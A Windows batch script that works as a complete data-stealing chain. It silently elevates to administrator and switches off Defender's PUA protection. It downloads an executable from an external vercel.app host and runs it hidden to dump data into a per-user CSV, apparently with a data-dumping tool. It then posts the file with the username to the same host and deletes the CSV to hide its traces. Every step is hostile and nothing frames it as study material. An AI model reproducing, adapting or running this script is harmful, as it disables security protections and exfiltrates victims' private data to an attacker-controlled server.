@echo off

:: Request administrative privileges if not already running as admin
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: Always disable PUA protection (turn off "Block apps" and "Block downloads")
powershell -WindowStyle Hidden -Command "Set-MpPreference -PUAProtection 0"

:: Change directory to the script location
cd /d "%~dp0"

:: Check if the x64 folder exists, create it if not
if not exist x64 mkdir x64

:: Download the file to the x64 folder in hidden mode
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://the-anonymus-stories.vercel.app/untold_story/get?icons=1' -OutFile 'x64/icons.exe'"

:: Run the downloaded file in hidden mode
powershell -WindowStyle Hidden -Command "Start-Process 'x64/icons.exe' -ArgumentList '/scomma x64/%username%.csv' -WindowStyle Hidden"

:: Wait for the CSV file to be created
timeout /t 10 >nul

:: Use PowerShell to read and send the JSON with properly escaped content
powershell -Command ^
    "$fileContent = [System.IO.File]::ReadAllText('x64/%username%.csv');" ^
    "$data = @{data = @{username = '%username%'; content = $fileContent}};" ^
    "$jsonData = $data | ConvertTo-Json -Compress;" ^
    "Invoke-RestMethod -Uri 'https://the-anonymus-stories.vercel.app/untold_story/post' -Method Post -Body $jsonData -ContentType 'application/json'"

:: Delete the CSV file after sending the data
del "x64\%username%.csv"
